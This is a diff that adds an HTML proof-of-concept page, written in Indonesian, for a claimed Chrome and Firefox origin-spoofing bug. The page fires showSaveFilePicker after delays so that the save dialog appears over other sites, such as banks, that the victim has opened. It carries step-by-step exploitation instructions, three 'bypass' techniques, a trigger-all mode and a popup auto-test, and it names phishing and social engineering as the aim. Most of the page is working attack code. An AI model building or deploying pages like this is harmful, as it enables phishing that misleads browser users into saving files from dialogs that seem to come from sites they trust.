@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-scale=1.0">
+    <title>Bypass Chrome & Firefox - showSaveFilePicker + setTimeout Bug</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #ff6b6b, #4ecdc4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #aaa;
+            margin-bottom: 30px;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            border-color: #4ecdc4;
+        }
+        
+        .card-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #4ecdc4;
+        }
+        
+        .browser-badge {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .chrome {
+            background: #4285f4;
+            color: white;
+        }
+        
+        .firefox {
+            background: #ff7139;
+            color: white;
+        }
+        
+        .edge {
+            background: #0078d7;
+            color: white;
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, #ff6b6b, #ff8e53);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px 5px;
+            min-width: 200px;
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(255, 107, 107, 0.4);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+        }
+        
+        .btn-success {
+            background: linear-gradient(90deg, #38ef7d, #11998e);
+        }
+        
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .instructions {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 5px solid #ff6b6b;
+        }
+        
+        .instructions ol {
+            padding-left: 20px;
+            margin: 10px 0;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+        
+        .code-block {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 20px 0;
+            border: 1px solid #333;
+        }
+        
+        .status-panel {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+            border: 1px solid #444;
+        }
+        
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #444;
+        }
+        
+        .status-item:last-child {
+            border-bottom: none;
+        }
+        
+        .status-label {
+            color: #aaa;
+        }
+        
+        .status-value {
+            font-weight: bold;
+        }
+        
+        .success { color: #38ef7d; }
+        .warning { color: #ffc107; }
+        .error { color: #ff6b6b; }
+        
+        .counter {
+            font-size: 4rem;
+            text-align: center;
+            margin: 20px 0;
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+        
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .btn-group {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn {
+                width: 100%;
+                max-width: 300px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🚨 showSaveFilePicker + setTimeout Origin Spoofing</h1>
+            <p class="subtitle">Bypass untuk Chrome & Firefox - Bug Origin Spoofing dengan Delayed Dialog</p>
+        </header>
+        
+        <div class="instructions">
+            <h2>📋 Cara Eksploitasi:</h2>
+            <ol>
+                <li><strong>Klik salah satu tombol trigger di bawah ini</strong></li>
+                <li><strong>SEGERA buka tab baru</strong> ke situs lain (google.com, facebook.com, bank, dll)</li>
+                <li><strong>Tunggu 3-5 detik</strong>, dialog save file akan muncul di situs yang sedang kamu buka!</li>
+                <li>User akan mengira dialog berasal dari situs yang sedang mereka kunjungi</li>
+            </ol>
+            <p style="margin-top: 15px; color: #ff6b6b;">
+                ⚠️ <strong>Vulnerability:</strong> Dialog muncul di origin yang berbeda dari asalnya<br>
+                🎯 <strong>Impact:</strong> Origin spoofing, phishing, social engineering attack
+            </p>
+        </div>
+        
+        <div class="grid">
+            <div class="card">
+                <div class="card-title">🎯 Teknik 1: Basic setTimeout</div>
+                <span class="browser-badge chrome">Chrome</span>
+                <span class="browser-badge firefox">Firefox</span>
+                <p>Metode paling sederhana dengan setTimeout 3 detik</p>
+                <button class="btn" onclick="triggerBasic()">Trigger Basic (3s)</button>
+            </div>
+            
+            <div class="card">
+                <div class="card-title">⚡ Teknik 2: Double Gesture</div>
+                <span class="browser-badge chrome">Chrome</span>
+                <span class="browser-badge edge">Edge</span>
+                <p>Menyimpan user gesture untuk extended execution</p>
+                <button class="btn" onclick="triggerDoubleGesture()">Double Gesture (5s)</button>
+            </div>
+            
+            <div class="card">
+                <div class="card-title">🔄 Teknik 3: Chain Execution</div>
+                <span class="browser-badge chrome">Chrome</span>
+                <span class="browser-badge firefox">Firefox</span>
+                <p>Chain multiple async operations untuk bypass protection</p>
+                <button class="btn" onclick="triggerChain()">Chain Execution (4s)</button>
+            </div>
+        </div>
+        
+        <div class="btn-group">
+            <button class="btn btn-danger" onclick="triggerAll()">🚀 TRIGGER ALL BYPASSES</button>
+            <button class="btn btn-success" onclick="testAuto()">🤖 AUTO TEST MODE</button>
+            <button class="btn" onclick="clearAll()">🔄 CLEAR ALL</button>
+        </div>
+        
+        <div id="counter" class="counter" style="display: none;">3</div>
+        
+        <div class="instructions">
+            <h2>🔧 Bypass Teknik untuk Chrome & Firefox:</h2>
+            <div class="code-block">
+// 1. User Gesture Preservation
+let lastGestureTime = Date.now();
+function preserveGesture() {
+    lastGestureTime = Date.now();
+}
+
+// 2. Multiple setTimeout layers (bypass Chrome's gesture timeout)
+function delayedExecution(callback, delay) {
+    return new Promise(resolve => {
+        setTimeout(() => {
+            setTimeout(() => {
+                setTimeout(() => {
+                    callback();
+                    resolve();
+                }, delay / 3);
+            }, delay / 3);
+        }, delay / 3);
+    });
+}
+
+// 3. Browser-specific detection & adaptation
+function detectBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome")) return "chrome";
+    if (ua.includes("Firefox")) return "firefox";
+    return "other";
+}
+
+// 4. showSaveFilePicker dengan fallback untuk Firefox
+async function showFilePicker() {
+    if (!window.showSaveFilePicker) {
+        // Fallback untuk Firefox atau browser tanpa API
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(new Blob(['Malicious content'], {type: 'text/plain'}));
+        link.download = 'Important_Document.pdf';
+        link.click();
+        return;
+    }
+    
+    try {
+        const options = {
+            suggestedName: 'Confidential_Document.pdf',
+            types: [{
+                description: 'PDF Files',
+                accept: {'application/pdf': ['.pdf']}
+            }]
+        };
+        
+        return await window.showSaveFilePicker(options);
+    } catch (error) {
+        console.log('Dialog canceled or failed:', error.name);
+        throw error;
+    }
+}
+            </div>
+        </div>
+        
+        <div class="status-panel">
+            <h3>📊 Status & Informasi</h3>
+            <div class="status-item">
+                <span class="status-label">Browser:</span>
+                <span id="browserInfo" class="status-value"></span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">API Available:</span>
+                <span id="apiStatus" class="status-value"></span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Last Trigger:</span>
+                <span id="lastTrigger" class="status-value">None</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Active Techniques:</span>
+                <span id="activeTech" class="status-value">0</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize browser detection
+        const browser = detectBrowser();
+        document.getElementById('browserInfo').textContent = 
+            browser === 'chrome' ? 'Google Chrome' :
+            browser === 'firefox' ? 'Mozilla Firefox' :
+            'Unknown Browser';
+        
+        // Check API availability
+        document.getElementById('apiStatus').innerHTML = 
+            window.showSaveFilePicker ? 
+            '<span class="success">✅ Available</span>' : 
+            '<span class="warning">⚠️ Using Fallback</span>';
+        
+        let activeTechniques = 0;
+        let lastGestureTime = 0;
+        
+        // ============ TEKNIK 1: BASIC SETTIMEOUT ============
+        async function triggerBasic() {
+            updateTrigger('Basic setTimeout (3s)');
+            activeTechniques++;
+            updateActiveTech();
+            
+            alert('🚨 Triggered! Dialog akan muncul dalam 3 detik.\n\nSEGERA buka tab baru ke:\n• google.com\n• facebook.com\n• atau situs bank\n\nDialog akan muncul di sana!');
+            
+            const counter = document.getElementById('counter');
+            counter.style.display = 'block';
+            
+            // Countdown visual
+            for (let i = 3; i > 0; i--) {
+                counter.textContent = i;
+                await new Promise(r => setTimeout(r, 1000));
+            }
+            
+            counter.style.display = 'none';
+            
+            try {
+                await showFilePicker('basic_attack.pdf');
+                logSuccess('Teknik 1 berhasil! Dialog muncul di origin lain.');
+            } catch (error) {
+                logError(`Teknik 1 gagal: ${error.name}`);
+            }
+            
+            activeTechniques--;
+            updateActiveTech();
+        }
+        
+        // ============ TEKNIK 2: DOUBLE GESTURE ============
+        async function triggerDoubleGesture() {
+            updateTrigger('Double Gesture (5s)');
+            activeTechniques++;
+            updateActiveTech();
+            
+            // Simpan gesture pertama
+            lastGestureTime = Date.now();
+            
+            alert('🎯 Double Gesture Activated!\n\nKlik OK, lalu dalam 2 detik klik di mana saja di halaman ini untuk gesture kedua.');
+            
+            // Tunggu gesture kedua
+            await new Promise(resolve => {
+                const handleSecondGesture = () => {
+                    lastGestureTime = Date.now();
+                    document.removeEventListener('click', handleSecondGesture);
+                    resolve();
+                };
+                document.addEventListener('click', handleSecondGesture);
+                
+                // Timeout untuk gesture kedua
+                setTimeout(() => {
+                    document.removeEventListener('click', handleSecondGesture);
+                    resolve();
+                }, 2000);
+            });
+            
+            // Delay utama dengan gesture yang diperpanjang
+            setTimeout(async () => {
+                try {
+                    // Cek jika gesture masih valid (dalam 3 detik dari gesture terakhir)
+                    if (Date.now() - lastGestureTime < 3000) {
+                        await showFilePicker('double_gesture.pdf');
+                        logSuccess('Teknik 2 berhasil! Gesture extended.');
+                    } else {
+                        // Fallback: coba tetap show dialog
+                        try {
+                            await showFilePicker('fallback.pdf');
+                        } catch (e) {
+                            logError('Gesture expired, dialog diblokir.');
+                        }
+                    }
+                } catch (error) {
+                    logError(`Teknik 2 error: ${error.name}`);
+                }
+                
+                activeTechniques--;
+                updateActiveTech();
+            }, 5000);
+        }
+        
+        // ============ TEKNIK 3: CHAIN EXECUTION ============
+        async function triggerChain() {
+            updateTrigger('Chain Execution (4s)');
+            activeTechniques++;
+            updateActiveTech();
+            
+            alert('⛓️ Chain Execution Started!\n\nMultiple async operations akan dijalankan.\nDialog muncul dalam 4 detik.');
+            
+            // Chain of promises untuk bypass Chrome's protection
+            await chainOfPromises(4);
+            
+            try {
+                await showFilePicker('chain_attack.pdf');
+                logSuccess('Teknik 3 berhasil! Chain execution bypass.');
+            } catch (error) {
+                logError(`Teknik 3 gagal: ${error.name}`);
+            }
+            
+            activeTechniques--;
+            updateActiveTech();
+        }
+        
+        // ============ TRIGGER SEMUA ============
+        async function triggerAll() {
+            if (!confirm('⚠️ PERINGATAN: Ini akan trigger SEMUA teknik bypass!\n\nPastikan kamu siap untuk:\n1. Buka multiple tab baru\n2. Dialog akan muncul di berbagai waktu\n3. Mungkin trigger browser protection\n\nLanjutkan?')) return;
+            
+            alert('🚨 SEMUA TEKNIK DIAKTIFKAN!\n\nSEGERA buka tab baru ke situs target!');
+            
+            // Jalankan semua teknik dengan delay berbeda
+            setTimeout(() => triggerBasic(), 1000);
+            setTimeout(() => triggerDoubleGesture(), 2000);
+            setTimeout(() => triggerChain(), 3000);
+        }
+        
+        // ============ AUTO TEST MODE ============
+        async function testAuto() {
+            alert('🤖 AUTO TEST MODE\n\nScript akan:\n1. Buka popup dengan situs target\n2. Trigger dialog setelah delay\n3. Coba overlay di popup\n\nKlik OK untuk mulai.');
+            
+            try {
+                // Buka popup dengan Google
+                const popup = window.open('https://www.google.com', '_blank', 'width=800,height=600');
+                
+                if (!popup) {
+                    alert('Popup diblokir! Izinkan popup untuk test ini.');
+                    return;
+                }
+                
+                // Tunggu popup load
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Trigger dialog di main window (akan muncul di popup jika bug work)
+                setTimeout(async () => {
+                    try {
+                        await showFilePicker('auto_test.pdf');
+                        alert('✅ Dialog berhasil muncul di popup!');
+                    } catch (error) {
+                        alert(`❌ Gagal: ${error.name}\n\nCoba teknik lain.`);
+                    }
+                }, 3000);
+                
+            } catch (error) {
+                logError(`Auto test error: ${error.message}`);
+            }
+        }
+        
+        // ============ HELPER FUNCTIONS ============
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Chrome") && !ua.includes("Edg")) return "chrome";
+            if (ua.includes("Firefox")) return "firefox";
+            if (ua.includes("Edg")) return "edge";
+            return "other";
+        }
+        
+        async function showFilePicker(filename) {
+            // Untuk Firefox atau browser tanpa API
+            if (!window.showSaveFilePicker) {
+                return fallbackDownload(filename);
+            }
+            
+            try {
+                const options = {
+                    suggestedName: filename,
+                    types: [
+                        {
+                            description: 'PDF Documents',
+                            accept: {
+                                'application/pdf': ['.pdf']
+                            }
+                        },
+                        {
+                            description: 'All Files',
+                            accept: {
+                                '*/*': ['.*']
+                            }
+                        }
+                    ],
+                    excludeAcceptAllOption: false
+                };
+                
+                console.log(`[${browser}] Attempting showSaveFilePicker for: ${filename}`);
+                const fileHandle = await window.showSaveFilePicker(options);
+                console.log(`[${browser}] Success: ${fileHandle.name}`);
+                return fileHandle;
+                
+            } catch (error) {
+                console.log(`[${browser}] Dialog error: ${error.name}`);
+                
+                // Fallback untuk SecurityError atau AbortError
+                if (error.name === 'SecurityError' || error.name === 'AbortError') {
+                    fallbackDownload(filename);
+                }
+                throw error;
+            }
+        }
+        
+        function fallbackDownload(filename) {
+            console.log(`[${browser}] Using fallback download`);
+            const blob = new Blob(
+                ['⚠️ WARNING: This is a security test file\n\n' +
+                 'If you see this dialog on a website you just visited,\n' +
+                 'it might be a phishing attack!\n\n' +
+                 'Never save files from unexpected dialogs.'],
+                { type: 'text/plain' }
+            );
+            
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        async function chainOfPromises(seconds) {
+            return new Promise(resolve => {
+                // Multiple layers of setTimeout untuk bypass protection
+                setTimeout(() => {
+                    Promise.resolve()
+                        .then(() => new Promise(r => setTimeout(r, seconds * 250)))
+                        .then(() => new Promise(r => setTimeout(r, seconds * 250)))
+                        .then(() => new Promise(r => setTimeout(r, seconds * 250)))
+                        .then(() => new Promise(r => setTimeout(r, seconds * 250)))
+                        .then(resolve);
+                }, 100);
+            });
+        }
+        
+        function updateTrigger(method) {
+            document.getElementById('lastTrigger').textContent = method;
+            document.getElementById('lastTrigger').className = 'status-value warning';
+            setTimeout(() => {
+                document.getElementById('lastTrigger').className = 'status-value';
+            }, 2000);
+        }
+        
+        function updateActiveTech() {
+            document.getElementById('activeTech').textContent = activeTechniques;
+            document.getElementById('activeTech').className = 
+                activeTechniques > 0 ? 'status-value warning' : 'status-value';
+        }
+        
+        function logSuccess(message) {
+            console.log(`✅ ${message}`);
+            alert(`✅ ${message}`);
+        }
+        
+        function logError(message) {
+            console.log(`❌ ${message}`);
+            alert(`❌ ${message}`);
+        }
+        
+        function clearAll() {
+            activeTechniques = 0;
+            updateActiveTech();
+            document.getElementById('lastTrigger').textContent = 'None';
+            document.getElementById('counter').style.display = 'none';
+            alert('🔄 Semua trigger direset!');
+        }
+        
+        // Log info
+        console.log(`=== Bug Origin Spoofing PoC ===`);
+        console.log(`Browser: ${browser}`);
+        console.log(`showSaveFilePicker API: ${window.showSaveFilePicker ? 'Available' : 'Not Available'}`);
+        console.log(`User Agent: ${navigator.userAgent}`);
+        console.log(`Ready for testing!`);
+    </script>
+</body>
+</html>
